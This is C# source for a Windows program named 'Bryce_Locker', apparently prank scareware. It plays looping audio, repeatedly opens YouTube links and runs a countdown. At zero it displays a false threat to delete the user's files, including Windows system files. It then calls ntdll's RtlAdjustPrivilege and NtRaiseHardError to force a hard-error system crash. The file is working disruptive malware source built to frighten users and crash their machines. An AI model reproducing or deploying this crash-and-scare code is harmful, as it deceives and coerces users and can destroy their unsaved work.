using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Bryce_Locker
{
    public partial class Form1 : Form
        {
        private int timeLeft = 7200;
        //Set this to false and update the information in the Design to disable beta mode.
        public bool beta = false;

        //player didn't loop before, I thought it might somehow be a garbage collection problem so i'll put this here
        SoundPlayer player = new SoundPlayer(Properties.Resources.JakePaulCancer);

        public void Jakepaul()
        {
            //Get memory stream from Resources and play it.... Forever.
           
            player.PlayLooping();
            //Open all the 'random youtube links lol'
            Process.Start("https://www.youtube.com/watch?v=oeCytho8wq4");
            Process.Start("https://www.youtube.com/watch?v=nXUWK80TOTI");
            Process.Start("https://www.youtube.com/watch?v=xxemNbibSuQ");
            Process.Start("https://www.youtube.com/watch?v=NbVK9aMjwm0&t=6s");
            Process.Start("https://www.youtube.com/watch?v=b89d1oip7WM");
            Process.Start("https://www.youtube.com/watch?v=Qc5mpSxq_WM");
        }
        
        public Form1()
            {
            InitializeComponent();
            }
        private void Form1_Load(object sender, EventArgs e)
        {
            Jakepaul();
            //Set time left to 60 if beta is true
            if (beta) timeLeft = 60;
        }
        private void BryceLockTimer_Tick(object sender, EventArgs e)
        {
            if (timeLeft > 0)
                {
                // Display the new time left
                // by updating the Time Left label.
                timeLeft = timeLeft - 1;
                timeLabel.Text = timeLeft + " seconds";
                }
            else
                {
                // If the user ran out of time, stop the timer, show
                // a MessageBox.
                BryceLockTimer.Stop();
                timeLabel.Text = "Time's up!";
                MessageBox.Show("You didn't follow the instructions, so your files will be deleted, including critical files required by Windows.");

                Crasher.Crash();
                }
        }

        private void timeLabel_Click(object sender, EventArgs e)
            {

            }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
            {
            Process.Start("https://www.youtube.com/watch?v=Q5m5rpNDNCA");
            }

        private void timer1_Tick(object sender, EventArgs e)
        {
            //Open all the 'random youtube links lol' every two minutes
            Process.Start("https://www.youtube.com/watch?v=oeCytho8wq4");
            Process.Start("https://www.youtube.com/watch?v=nXUWK80TOTI");
            Process.Start("https://www.youtube.com/watch?v=xxemNbibSuQ");
            Process.Start("https://www.youtube.com/watch?v=NbVK9aMjwm0&t=6s");
            Process.Start("https://www.youtube.com/watch?v=b89d1oip7WM");
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
    public class Crasher
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern void NtRaiseHardError(uint errorStatus,
                int a, int b, int c, /* Unused */
                int responseOption,
                out int response);
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern IntPtr RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege,
                bool IsThreadPrivilege, out bool PreviousValue);
        public static void Crash()
        {
            bool x; int y;
            RtlAdjustPrivilege(19 /* SeShutdownPrivilege */, true, false, out x);
            NtRaiseHardError(0xc0000022, 0, 0, 0, 6 /* OptionShutdownSystem */, out y);
        }
    }



}

